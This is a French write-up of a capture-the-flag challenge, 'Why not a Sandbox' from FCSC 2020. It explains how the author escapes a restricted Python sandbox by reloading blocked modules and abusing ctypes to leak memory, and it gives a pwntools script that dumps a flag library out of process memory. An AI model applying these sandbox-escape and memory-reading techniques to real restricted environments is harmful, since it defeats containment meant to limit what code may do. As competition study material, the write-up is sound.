---
title: "Why not a Sandbox"
subtitle: "Challenge de Pwn du FCSC 2020"
published: true
author: "Bdenneu"
ctf: "FCSC"
annee: "2020"
---

# L'énoncé

Votre but est d'appeler la fonction print_flag pour afficher le flag.

Service : nc challenges1.france-cybersecurity-challenge.fr 2001

# Etat des lieux

En arrivant sur la machine, on voit que certains imports de librairies sont bloqués. On a cependant accès à sys. On peut alors se demander quels sont les modules déjà chargés :

![](/assets/images/FCSC2020/Sandbox/1.png)

J’ai trouvé un moyen de recharger les librairies par défaut. En fouillant dans le garbage collector, on ne trouve pas d’allusion à print_flag, donc la fonction ne se cache pas dans le python. Vu que os est rechargé, on a un shell sur la machine. Aussi, on pouvait avoir os via ctypes (ctypes._os).

![](/assets/images/FCSC2020/Sandbox/2.png)

![](/assets/images/FCSC2020/Sandbox/3.png)

![](/assets/images/FCSC2020/Sandbox/10.png)

Nous sommes donc dans spython et il le flag est surement dans lib_flag.so. Cependant, nous n’avons pas les droits pour le lire. Malgré la permission s sur spython, il ne permettra pas de devenir ctf-init vu qu’un setuid / setreuid sont effectués au lancement.

![](/assets/images/FCSC2020/Sandbox/4.png)

Aussi, en créeant une chaine de bytes, j’ai vu qu’elle était placée un peu avant les libs importées. Du fait qu’on puisse lire les chaines de caractères en mémoire, j’ai bruteforce l’offset autour de la chaine qu’on a récupéré pour récupérer la lib flag en mémoire.

![](/assets/images/FCSC2020/Sandbox/5.png)

```python
from pwn import *
import re

r = remote('challenges1.france-cybersecurity-challenge.fr',4005)
print(r.recvuntil('>>>'))

#leak memory
r.sendline('import ctypes')
print(r.recvuntil('>>>'))
r.sendline('x=b"print_flag"')
print(r.recvuntil('>>>'))
r.sendline('c_s = ctypes.c_char_p(x)')
print(r.recvuntil('>>>'))
r.sendline('c_s')
data = r.recvuntil('>>>')
print(data)
leaked = (int(re.findall(b'c_char_p\(([0-9]*)\)\r\n',data)[0])>>12)<<12
print("leaked libc=0x%08x"%leaked)

offset = 0x690000
jump = 0x10000
data = b""

while not(b"ELF" in data):
    print("Currently at: 0x%0x"%(leaked+offset))
    r.sendline('print(ctypes._string_at('+str(leaked+offset)+','+str(jump)+'))')
    data = r.recvuntil('>>>')
    if b'ELF' in data:
        break
    offset += jump

r.sendline('x=ctypes._string_at('+str(leaked+offset)+',0x100000)')
data = r.recvuntil('>>>')

#reload modules
r.sendline('import sys')
print(r.recvuntil('>>>'))
r.sendline('sys.meta_path[2].find_distributions()')
print(r.recvuntil('>>>'))
r.sendline('import binascii')
print(r.recvuntil('>>>'))

print("binascii: ")
print("===========================================")
r.sendline('binascii.hexlify(x)')
data = r.recvuntil('>>>')
with open('lib_flag.so','wb') as f:
    f.write(data)

```

On récupere ainsi lib_flag.so:

![](/assets/images/FCSC2020/Sandbox/7.png)

On peut ainsi y voir la superbe fonction print_flag :

![](/assets/images/FCSC2020/Sandbox/8.png)

À partir de la, soit on lit l’assembleur (il ne s’agit que d’un xor et une boucle après tout), soit on récupère les instructions et on les exécute dans notre debugger :

# Flag

![](/assets/images/FCSC2020/Sandbox/9.png)


